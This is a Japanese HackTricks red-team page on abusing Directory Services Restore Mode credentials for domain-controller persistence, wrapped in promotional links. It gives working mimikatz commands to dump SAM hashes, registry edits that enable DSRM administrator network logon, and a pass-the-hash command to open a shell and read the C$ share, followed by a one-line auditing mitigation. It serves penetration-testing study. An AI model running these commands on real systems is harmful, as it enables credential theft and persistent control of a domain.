<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告掲載したい場合**や**HackTricksをPDFでダウンロードしたい場合**は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングテクニックを共有する。

</details>


# DSRMクレデンシャル

各**DC**内には**ローカル管理者**アカウントが存在します。このマシンで管理者権限を持っている場合、mimikatzを使用して**ローカル管理者のハッシュをダンプ**することができます。次に、レジストリを変更してこのパスワードを**アクティブにし**、このローカル管理者ユーザーにリモートアクセスできるようにします。\
まず、DC内の**ローカル管理者**ユーザーの**ハッシュ**を**ダンプ**する必要があります：
```bash
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
```
そのアカウントが機能するかどうかを確認する必要があります。レジストリキーに値「0」があるか、存在しない場合は、**「2」に設定する必要があります**：
```bash
Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior #Check if the key exists and get the value
New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD #Create key with value "2" if it doesn't exist
Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2  #Change value to "2"
```
その後、PTHを使用して**C$の内容をリストしたり、シェルを取得することができます**。新しいpowershellセッションをそのハッシュをメモリ内で使用して作成する場合（PTHのために）、**使用される"ドメイン"はDCマシンの名前だけです：**
```bash
sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
#And in new spawned powershell you now can access via NTLM the content of C$
ls \\dc-host-name\C$
```
以下の情報については、こちらを参照してください： [https://adsecurity.org/?p=1714](https://adsecurity.org/?p=1714) と [https://adsecurity.org/?p=1785](https://adsecurity.org/?p=1785)

## 軽減策

* イベント ID 4657 - `HKLM:\System\CurrentControlSet\Control\Lsa DsrmAdminLogonBehavior` の作成/変更を監査する


<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) で AWS ハッキングをゼロからヒーローまで学ぶ</strong></summary>

HackTricks をサポートする他の方法：

* **HackTricks にあなたの会社を広告したい**、または **HackTricks を PDF でダウンロードしたい** 場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式 PEASS & HackTricks グッズ**](https://peass.creator-spring.com) を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) を発見する、私たちの独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) のコレクション
* 💬 [**Discord グループ**](https://discord.gg/hRep4RUj7f) に**参加する**か、[**telegram グループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) の github リポジトリに PR を提出して、あなたのハッキングのコツを**共有する**。

</details>
